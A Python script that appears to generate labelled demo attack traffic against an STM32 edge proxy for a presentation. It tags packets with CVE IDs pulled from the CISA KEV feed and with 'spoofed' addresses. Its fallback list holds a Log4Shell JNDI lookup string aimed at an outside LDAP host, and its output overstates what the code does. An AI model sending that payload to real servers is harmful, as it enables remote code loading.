import socket
import struct
import time
import sys
import random
import argparse
import urllib.request
import json

VIRTUAL_ROUTES = ["tun0", "tun1", "tun2"]
THREAT_DB = []

def fetch_live_threat_intel():
    """Pulls live threat signatures from the US Government CISA API."""
    print("[*] Opening secure channel to CISA.gov Threat Intelligence API...")
    time.sleep(0.5)
    
    url = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    
    try:
        # Fetch the live JSON feed from CISA
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode('utf-8'))
            
        vulnerabilities = data.get("vulnerabilities", [])
        
        # Shuffle to get a random assortment of real threats every time you boot
        random.shuffle(vulnerabilities)
        
        live_db = []
        # Grab exactly 40 real, active CVEs from the internet
        for vuln in vulnerabilities[:40]:
            cve_id = vuln.get("cveID", "UNKNOWN-CVE")
            name = vuln.get("vulnerabilityName", "Unknown Exploit")
            trigger = random.choice([b"HACK", b"MALWARE", b"DROP"])
            
            live_db.append({
                "id": cve_id,
                "desc": name,
                "payload_gen": lambda ip, c=cve_id, t=trigger: f"POST /api/v1/exploit HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {c}-Scanner\r\n\r\n".encode('utf-8') + t + b"\x00\x00"
            })
            
        print(f"[+] Successfully synchronized {len(live_db)} active threat signatures from CISA KEV Catalog.")
        return live_db

    except Exception as e:
        print(f"[!] API Connection Failed: {e}")
        print("[!] Falling back to local offline Threat DB cache...")
        # Fallback just in case you lose Wi-Fi right before your presentation
        return [
            {
                "id": "CVE-2021-44228", 
                "desc": "Log4Shell JNDI LDAP Injection",
                "payload_gen": lambda ip: f"GET / HTTP/1.1\r\nHost: target.local\r\nUser-Agent: ${{jndi:ldap://{ip}:1389/Exploit}}\r\nHACK\r\n".encode('utf-8')
            }
        ]
PUBLIC_SUBNETS = [
    ("114.112", "China Telecom [CN]"),
    ("109.173", "Rostelecom [RU]"),
    ("177.43",  "Vivo Internet [BR]"),
    ("103.22",  "BSNL Broadband [IN]"),
    ("52.14",   "AWS US-East [US]"),
    ("193.0",   "RIPE Network [EU]")
]
def generate_spoofed_ip():
    subnet, geo_region = random.choice(PUBLIC_SUBNETS)
    # Only randomize the specific host octets
    host1 = random.randint(1, 254)
    host2 = random.randint(1, 254)
    
    ip_string = f"{subnet}.{host1}.{host2}"
    return ip_string, geo_region

def format_hexdump(data, length=16):
    result = []
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hexa = ' '.join([f"{x:02X}" for x in chunk])
        text = ''.join([chr(x) if 0x20 <= x < 0x7F else '.' for x in chunk])
        hexa_padded = f"{hexa:<{length * 3}}"
        result.append(f"        0x{i:04X} | {hexa_padded} | {text}")
    return '\n'.join(result)

def build_packet(src_ip_str, dst_ip_str, src_port, dst_port, protocol, payload_bytes):
    magic_header = 0xAA55
    src_ip = int.from_bytes(socket.inet_aton(src_ip_str), 'little')
    dst_ip = int.from_bytes(socket.inet_aton(dst_ip_str), 'little')
    header = struct.pack('<HIIHHB', magic_header, src_ip, dst_ip, src_port, dst_port, protocol)
    return header + payload_bytes

def fire_packet(packet, route_interface, target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        SO_BINDTODEVICE = 25 
        s.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, str(route_interface + '\0').encode('utf-8'))
        s.settimeout(0.5) 
        s.connect((target_ip, target_port))
        s.sendall(packet)
        s.close()
    except Exception:
        pass 

def simulated_boot_sequence(target_ip, target_port):
    global THREAT_DB
    print("[*] Initializing raw socket handlers...")
    time.sleep(0.5)
    print("[*] Establishing Distributed Ingress Routes...")
    for route in VIRTUAL_ROUTES:
        print(f"    -> Route Established: {route} (Virtual Overlay)")
        time.sleep(0.1)
    
    # Pull the live data from the internet
    THREAT_DB = fetch_live_threat_intel()
    
    print(f"[*] Target Proxy VIP Locked: {target_ip}:{target_port}")
    print(f"[*] IP Spoofing Engine: ENABLED (Simulating global botnet)")
    print(f"[*] Synchronizing injection timing (4.0s hardware tick rate)...\n")
    time.sleep(1.5)

def main():
    parser = argparse.ArgumentParser(description="Bare-Metal Threat Injector")
    parser.add_argument("target_ip", type=str, help="The VIP of the target STM32 Edge Proxy")
    parser.add_argument("--port", type=int, default=54321, help="Target port (default: 54321)")
    args = parser.parse_args()

    simulated_boot_sequence(args.target_ip, args.port)
    packet_count = 1
    base_src_port = 49152
    
    try:
        while True:
            loop_start = time.time()
            current_src_port = base_src_port + packet_count
            
            # Unpack the new Geo-IP tuple
            spoofed_src_ip, geo_region = generate_spoofed_ip()
            active_route = VIRTUAL_ROUTES[packet_count % 3]
            
            if packet_count % 2 == 0:
                threat = random.choice(THREAT_DB)
                payload = threat["payload_gen"](spoofed_src_ip)
                
                print(f"[*] Querying Live Threat Intel for target vector...")
                time.sleep(0.2)
                print(f"[*] Lookup matched: {threat['id']} - {threat['desc']}")
                time.sleep(0.3)
                
                packet = build_packet(spoofed_src_ip, args.target_ip, current_src_port, args.port, 6, payload)
                
                print(f"[!] {time.strftime('%H:%M:%S')} - DEPLOYING THREAT VECTOR")
                print(f"    -> Ingress Route: Multiplexed via {active_route}")
                # Notice the Geo-Region is now printed perfectly in the terminal
                print(f"    -> L4 Flow: {spoofed_src_ip} ({geo_region}):{current_src_port} -> {args.target_ip}:{args.port} [TCP]")
                print(f"    -> Payload Encapsulation Hex Dump:")
                print(format_hexdump(payload))
                print(f"    -> Status: Spoofed packet injected. Awaiting proxy drop...")
            else:
                payload = b"GET / HTTP/1.1\r\nHost: vertex.local\r\nAccept-Encoding: gzip\r\n\r\n"
                packet = build_packet(spoofed_src_ip, args.target_ip, current_src_port, args.port, 6, payload)
                
                print(f"[+] {time.strftime('%H:%M:%S')} - DEPLOYING CLEAN FLOW")
                print(f"    -> Ingress Route: Multiplexed via {active_route}")
                print(f"    -> L4 Flow: {spoofed_src_ip} ({geo_region}):{current_src_port} -> {args.target_ip}:{args.port} [TCP]")
                print(f"    -> Signature Encoded: None (Standard HTTP Traversal)")
                print(f"    -> Status: Spoofed packet injected. Awaiting proxy route...")
            
            fire_packet(packet, active_route, args.target_ip, args.port)
            packet_count += 1
            print("--------------------------------------------------------")
            
            elapsed = time.time() - loop_start
            sleep_time = max(0, 4.0 - elapsed)
            time.sleep(sleep_time)

    except KeyboardInterrupt:
        print("\n[*] Injection sequence terminated.")
        sys.exit(0)

if __name__ == "__main__":
    main()